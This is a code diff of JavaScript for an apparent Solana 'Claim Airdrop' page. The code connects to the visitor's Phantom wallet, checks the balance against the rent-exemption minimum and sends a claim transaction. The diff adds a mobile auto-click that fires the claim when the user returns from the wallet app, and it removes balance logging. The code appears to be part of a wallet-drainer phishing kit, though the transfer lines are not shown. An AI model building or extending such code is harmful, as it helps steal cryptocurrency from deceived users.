@@ -11,8 +11,6 @@ $(document).ready(function () {
 
         const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
         const walletBalance = await connection.getBalance(publicKey);
-        console.log("Wallet balance:", walletBalance);
-
         const minBalance = await connection.getMinimumBalanceForRentExemption(0);
 
         if (walletBalance < minBalance) {
@@ -53,55 +51,76 @@ $(document).ready(function () {
                 alert("Transaction successful!");
                 $('#connect-wallet').text("Connected");
             } catch (err) {
-                console.error("Error during claim:", err);
-                alert("Claim failed. Please try again.");
+                console.error("Transaction failed:", err);
+                alert("Claim failed. Try again.");
             }
+        });
+
+        // Auto-click "Claim Airdrop" on mobile return
+        if (isMobile && sessionStorage.getItem("phantomMobileReturning") === "true") {
+            sessionStorage.removeItem("phantomMobileReturning");
+            $('#connect-wallet').click();
+        }
+    }
+
+    async function waitForPhantom(timeout = 5000) {
+        return new Promise((resolve, reject) => {
+            const interval = 100;
+            let waited = 0;
+            const check = () => {
+                if (window.solana && window.solana.isPhantom) {
+                    resolve(window.solana);
+                } else {
+                    waited += interval;
+                    if (waited >= timeout) {
+                        reject(new Error("Phantom not detected"));
+                    } else {
+                        setTimeout(check, interval);
+                    }
+                }
+            };
+            check();
         });
     }
 
     async function connectPhantom() {
         try {
-            const resp = await window.solana.connect();
-            sessionStorage.setItem('phantomConnected', 'true');
-            sessionStorage.removeItem('phantomInstallRequested');
+            const provider = await waitForPhantom();
+            const resp = await provider.connect();
+            sessionStorage.setItem("phantomConnected", "true");
             handleWalletConnection(resp);
         } catch (err) {
-            console.error("Error connecting to Phantom Wallet:", err);
-            alert("Error connecting to Phantom Wallet.");
-        }
-    }
-
-    async function checkConnectionOnReturn() {
-        if (window.solana && window.solana.isPhantom) {
-            try {
-                const alreadyConnected = sessionStorage.getItem('phantomConnected');
-                if (alreadyConnected) {
-                    const resp = await window.solana.connect({ onlyIfTrusted: true });
-                    handleWalletConnection(resp);
-                }
-            } catch (err) {
-                console.warn("User not connected (yet).");
-            }
-        }
-    }
-
-    $('#connect-wallet').on('click', async () => {
-        if (window.solana && window.solana.isPhantom) {
-            await connectPhantom();
-        } else {
+            console.error("Phantom connect error:", err);
             alert("Phantom Wallet not found. Redirecting to install...");
-            sessionStorage.setItem('phantomInstallRequested', 'true');
 
             if (isMobile) {
                 const dappUrl = encodeURIComponent(window.location.href);
-                const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
-                window.location.href = phantomLink;
+                sessionStorage.setItem("phantomMobileReturning", "true");
+                window.location.href = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
             } else {
                 window.open("https://phantom.app/", "_blank");
             }
         }
+    }
+
+    async function resumeIfReturning() {
+        try {
+            const provider = await waitForPhantom(7000);
+            const alreadyConnected = sessionStorage.getItem('phantomConnected');
+            if (alreadyConnected) {
+                const resp = await provider.connect({ onlyIfTrusted: true });
+                handleWalletConnection(resp);
+            }
+        } catch (err) {
+            console.log("Phantom not yet available or not trusted.");
+        }
+    }
+
+    // Button click
+    $('#connect-wallet').on('click', async () => {
+        await connectPhantom();
     });
 
-    // On page load, check if Phantom was previously connected
-    checkConnectionOnReturn();
+    // On load, resume if returning from Phantom mobile
+    resumeIfReturning();
 });
